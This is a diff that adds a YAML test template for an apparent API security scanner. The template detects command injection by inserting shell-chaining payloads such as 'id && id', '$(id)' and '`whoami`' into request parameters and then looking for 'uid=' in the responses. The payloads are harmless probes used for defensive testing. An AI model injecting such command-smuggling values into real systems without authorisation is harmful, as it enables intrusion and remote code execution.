@@ -1,0 +1,107 @@
+id: SMART_COMMAND_INJECTION_VARIABLE_ASSIGNMENT
+info:
+  name: Command Injection by Variable Assignment - Smart Testing
+  description: Smart testing for command injection vulnerabilities through variable assignment. Detects when user input can be used to execute arbitrary system commands through parameter manipulation and injection.
+  details: Tests for command injection by intelligently attempting to inject and execute system commands through various techniques including encoding manipulation, operator chaining, and special character sequences. The system identifies vulnerable input handlers that accept and execute injected commands.
+  impact: Remote code execution, system compromise, unauthorized access, data exposure, and complete system takeover.
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: SMART_COMMAND_INJECTION_VARIABLE_ASSIGNMENT
+  severity: CRITICAL
+  agenticTestingAllowed: true
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe:
+    - CWE-77
+    - CWE-78
+  cve:
+    - CVE-2023-25826
+    - CVE-2023-41031
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Unauthorized
+      - access denied
+      - Forbidden
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: injection_key
+          value:
+            extract: injection_value
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: injection_key
+          value:
+            extract: injection_value
+
+wordLists:
+  commandPayloads:
+    - "id && id"
+    - "id & id"
+    - "id ; id"
+    - "id | id"
+    - "id || id"
+    - "id%20&&%20id"
+    - "id%26%26id"
+    - "id\nid"
+    - "id\rid"
+    - "id\t&&\tid"
+    - "id%00id"
+    - "cat <<< \"$(id)\""
+    - "id && date +\"%d-%B-%Y\""
+    - "id; date +\"%d-%B-%Y\";"
+    - "id && (id && date +\"%d-%B-%Y\")"
+    - "$(id)"
+    - "`id`"
+    - "$(whoami)"
+    - "`whoami`"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param:
+            injection_key: ${commandPayloads}
+        - modify_query_param:
+            injection_key: ${commandPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_any:
+                - "uid="
+                - "gid="
+                - "groups="
+              not_contains:
+                - Error
+                - Unauthorized
+                - access denied
+                - Forbidden
+
